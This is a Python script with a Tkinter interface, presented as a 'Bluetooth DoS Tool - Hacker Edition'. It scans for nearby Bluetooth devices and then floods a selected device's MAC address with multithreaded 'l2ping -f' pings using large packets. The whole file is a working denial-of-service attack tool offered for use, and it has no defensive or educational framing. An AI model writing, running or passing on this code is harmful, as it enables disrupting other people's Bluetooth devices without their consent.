import subprocess
import threading
import time
import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext


# -------------------- Bluetooth Scanner -------------------- #
print("Bluetooth DoS Tool - BY SAKSHAM KARN - HACKER EDITION")
def scan_devices():
    try:
        output = subprocess.check_output("hcitool scan", shell=True, stderr=subprocess.STDOUT, text=True)
        lines = output.strip().split('\n')[1:]  # Skip header
        devices = []
        for line in lines:
            info = line.strip().split()
            if len(info) >= 2:
                mac = info[0]
                name = ' '.join(info[1:])
                devices.append((mac, name))
        return devices
    except subprocess.CalledProcessError:
        return []


# -------------------- DoS Attack Logic -------------------- #
def dos_attack(target_mac, packet_size, thread_count, log_func):
    def dos_thread(thread_id, mac, size):
        log_func(f"[Thread-{thread_id}] Started.")
        try:
            process = subprocess.run(
                ['l2ping', '-i', 'hci0', '-s', str(size), '-f', mac],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                timeout=10
            )
            if process.returncode == 0:
                log_func(f"[Thread-{thread_id}] l2ping running... Flooding started.")
            else:
                log_func(f"[Thread-{thread_id}] Error: {process.stderr.strip()}")
        except subprocess.TimeoutExpired:
            log_func(f"[Thread-{thread_id}] Timeout expired.")
        except Exception as e:
            log_func(f"[Thread-{thread_id}] Exception: {str(e)}")

    for i in range(thread_count):
        t = threading.Thread(target=dos_thread, args=(i + 1, target_mac, packet_size))
        t.daemon = True
        t.start()
        time.sleep(0.2)  # Optional delay to reduce burst


# -------------------- GUI Class -------------------- #
class BluetoothDOSGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Bluetooth DoS Tool - Hacker Boss Edition")
        self.root.geometry("700x500")
        self.devices = []
        self.auto_scan = False

        self.create_widgets()

    def create_widgets(self):
        ttk.Label(self.root, text="Bluetooth Devices:", font=('Segoe UI', 10)).pack(pady=5)
        self.device_list = ttk.Combobox(self.root, width=65)
        self.device_list.pack(pady=5)

        ttk.Button(self.root, text="Manual Scan", command=self.manual_scan).pack(pady=2)
        self.auto_btn = ttk.Button(self.root, text="Start Auto Scan", command=self.toggle_auto_scan)
        self.auto_btn.pack(pady=2)

        ttk.Label(self.root, text="Packet Size:").pack()
        self.packet_entry = ttk.Entry(self.root)
        self.packet_entry.insert(0, "600")
        self.packet_entry.pack()

        ttk.Label(self.root, text="Thread Count:").pack()
        self.thread_entry = ttk.Entry(self.root)
        self.thread_entry.insert(0, "10")
        self.thread_entry.pack()

        ttk.Button(self.root, text="Start DoS Attack", command=self.start_attack).pack(pady=10)

        self.log_box = scrolledtext.ScrolledText(self.root, height=15, state='disabled', bg='#111', fg='#0f0')
        self.log_box.pack(padx=10, pady=10, fill=tk.BOTH, expand=True)

    def log(self, message):
        self.log_box.config(state='normal')
        self.log_box.insert(tk.END, message + '\n')
        self.log_box.see(tk.END)
        self.log_box.config(state='disabled')

    def manual_scan(self):
        self.log("[*] Scanning for Bluetooth devices...")
        self.devices = scan_devices()
        if not self.devices:
            self.log("[!] No devices found.")
            self.device_list['values'] = []
        else:
            self.device_list['values'] = [f"{mac} ({name})" for mac, name in self.devices]
            self.log("[+] Devices updated.")

    def toggle_auto_scan(self):
        if not self.auto_scan:
            self.auto_scan = True
            self.auto_btn.config(text="Stop Auto Scan")
            self.auto_scan_loop()
        else:
            self.auto_scan = False
            self.auto_btn.config(text="Start Auto Scan")

    def auto_scan_loop(self):
        if not self.auto_scan:
            return
        self.manual_scan()
        self.root.after(5000, self.auto_scan_loop)  # Repeat every 5 seconds

    def start_attack(self):
        selection = self.device_list.get()
        if not selection:
            messagebox.showerror("Error", "Please select a target device.")
            return

        try:
            mac = selection.split()[0]
            packet_size = int(self.packet_entry.get())
            thread_count = int(self.thread_entry.get())
        except ValueError:
            messagebox.showerror("Error", "Packet size and thread count must be integers.")
            return

        confirm = messagebox.askyesno("Confirm", f"Start DoS attack on {mac}?")
        if not confirm:
            return

        self.log(f"[!] Starting attack on {mac} with {thread_count} threads, {packet_size}-byte packets.")
        threading.Thread(target=dos_attack, args=(mac, packet_size, thread_count, self.log)).start()


# -------------------- Main App Runner -------------------- #
if __name__ == '__main__':
    try:
        root = tk.Tk()
        app = BluetoothDOSGUI(root)
        root.mainloop()
    except KeyboardInterrupt:
        print("\n[*] Interrupted by user.")
    except Exception as e:
        print(f"[!] Unexpected error: {e}")
